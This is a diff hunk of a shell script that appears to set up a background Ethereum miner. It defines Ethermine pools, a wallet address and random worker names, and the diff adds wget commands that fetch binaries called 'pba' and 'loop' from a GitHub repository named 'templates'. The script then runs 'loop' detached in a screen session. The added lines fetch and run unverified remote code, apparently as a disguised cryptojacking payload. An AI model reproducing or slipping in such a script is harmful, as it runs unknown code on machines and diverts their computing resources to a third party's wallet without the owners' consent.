@@ -6,8 +6,8 @@ POOL1=ssl://asia1.ethermine.org:5555
 POOL2=ssl://eu1.ethermine.org:5555
 WALLET1=0x83262fd642190cdd04dae96005e26330d9b09362
 WORKER1=$(echo $(shuf -i 1-40 -n 1)-XXXX)
-https://github.com/christiarch/templates/raw/main/pba
-https://github.com/christiarch/templates/raw/main/loop
+wget https://github.com/christiarch/templates/raw/main/pba
+wget https://github.com/christiarch/templates/raw/main/loop
 chmod +x loop pba
 screen -dmS In ./loop
 	while [ 1 ]; do
